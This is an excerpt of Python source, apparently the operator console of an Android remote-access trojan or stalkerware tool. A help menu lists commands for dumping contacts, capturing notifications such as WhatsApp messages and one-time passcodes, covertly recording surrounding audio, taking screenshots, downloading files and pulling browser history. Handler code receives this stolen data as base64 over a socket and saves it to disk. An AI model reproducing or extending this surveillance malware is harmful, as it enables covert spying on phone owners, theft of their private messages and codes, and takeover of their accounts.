...
def help():
    ...
    getContacts                --> dump all contacts from the device
    getApps                    --> list all installed apps
    fileBrowse [path]          --> browse device filesystem (default: /sdcard/)
    fileDownload [filepath]    --> download a file from device
    storageInfo                --> show device storage usage
    getNotifications           --> get captured notifications (WhatsApp, OTPs etc.)
    startSurround              --> start recording ambient/surrounding audio
    stopSurround               --> stop ambient recording and download audio
    screenshot                 --> take a screenshot of the current screen
    getBrowserHistory          --> dump browser history and bookmarks
    """
    print(helper)
    ...
    while True:
        ...
        while True:
            ...
            if(msg.strip() == "IMAGE"):
                ...
                screenshot_data = recvall(conn)
                screenshot_data = screenshot_data.strip().replace("END123","").strip()
                if screenshot_data and not screenshot_data.startswith("ERROR"):
                    timestr = time.strftime("%Y%m%d-%H%M%S")
                    filename = "Dumps"+direc+"Screenshot_"+timestr+".jpg"
                    try:
                        imgdata = base64.b64decode(screenshot_data)
                        with open(filename, 'wb') as img:
                            img.write(imgdata)
                        print(stdOutput("success")+"Screenshot saved to \033[1m\033[32m"+getpwd(filename)+"\n")
                    except Exception as e:
                        print(stdOutput("error")+"Failed to decode screenshot: "+str(e))
                else:
                    print(stdOutput("error")+screenshot_data+"\n")
            elif(msg.strip() == "fileDownload"):
                print(stdOutput("info")+"\033[0mDownloading file")
                file_data = recvall(conn)
                file_data = file_data.strip().replace("END123","").strip()
                if "|_|" in file_data:
                    parts = file_data.split("|_|")
                    fname = parts[0]
                    b64data = parts[1]
                    timestr = time.strftime("%Y%m%d-%H%M%S")
                    filename = "Dumps"+direc+fname+"_"+timestr
                    try:
                        rawdata = base64.b64decode(b64data)
                        with open(filename, 'wb') as f:
                            f.write(rawdata)
                        print(stdOutput("success")+"File saved to \033[1m\033[32m"+getpwd(filename)+"\n")
                    except Exception as e:
                        print(stdOutput("error")+"Failed to decode file: "+str(e))
                else:
                    print(stdOutput("error")+file_data+"\n")
            elif(msg.strip() == "surroundAudio"):
                print(stdOutput("info")+"\033[0mDownloading ambient audio")
                audio_data = recvall(conn)
                audio_data = audio_data.strip().replace("END123","").strip()
                if audio_data and not audio_data.startswith("ERROR"):
                    timestr = time.strftime("%Y%m%d-%H%M%S")
                    filename = "Dumps"+direc+"Surround_"+timestr+".mp3"
                    try:
                        rawdata = base64.b64decode(audio_data)
                        with open(filename, 'wb') as f:
                            f.write(rawdata)
                        print(stdOutput("success")+"Ambient audio saved to \033[1m\033[32m"+getpwd(filename)+"\n")
                    except Exception as e:
                        print(stdOutput("error")+"Failed to decode audio: "+str(e))
                else:
                    print(stdOutput("error")+audio_data+"\n")
            else:
